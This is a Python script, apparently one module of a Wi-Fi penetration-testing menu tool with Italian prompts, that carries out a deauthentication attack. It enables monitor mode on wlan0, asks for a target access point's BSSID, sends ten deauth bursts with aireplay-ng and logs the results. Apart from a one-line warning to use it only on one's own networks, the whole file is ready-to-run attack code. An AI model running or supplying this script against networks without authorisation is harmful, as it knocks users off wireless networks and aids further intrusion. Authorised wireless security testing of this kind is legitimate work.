#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Deauthentication attack using aireplay-ng.
Requires monitor mode (airmon-ng start wlan0) and target BSSID.
"""

import os
import subprocess
import time
from datetime import datetime

LOG_FILE = "wifi_pen.log"

def log_message(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

def main():
    log_message("=== DEAUTH ATTACK START ===")
    print("\n⚠️  ATTENZIONE: Usa solo su reti di proprietà.\n")
    bssid = input("Inserisci BSSID (MAC dell'AP): ").strip()
    if not bssid:
        print("BSSID non valido.")
        return

    # Verifica che aireplay-ng sia disponibile
    if not os.system("which aireplay-ng > /dev/null 2>&1") == 0:
        print("aireplay-ng non trovato. Installa aircrack-ng.")
        log_message("aireplay-ng not found")
        return

    # Opzionale: attivare monitor mode
    print("Attivazione modalità monitor su wlan0...")
    subprocess.run(["airmon-ng", "start", "wlan0"], capture_output=True)
    time.sleep(2)
    interface = "wlan0mon"  # di solito diventa così

    cmd = ["aireplay-ng", "-0", "10", "-a", bssid, interface]
    log_message(f"Executing: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        log_message(f"Return code: {result.returncode}")
        log_message("Output:\n" + result.stdout)
        if result.stderr:
            log_message("Stderr:\n" + result.stderr)
        print("\nAttacco eseguito. Controlla il log.")
    except Exception as e:
        log_message(f"Exception: {e}")
        print(f"\nErrore: {e}")
    finally:
        # Rimuovi monitor mode
        subprocess.run(["airmon-ng", "stop", interface], capture_output=True)
    log_message("=== DEAUTH ATTACK END ===")
    print("\nPremi ENTER per tornare al menu.")
    input()

if __name__ == "__main__":
    main()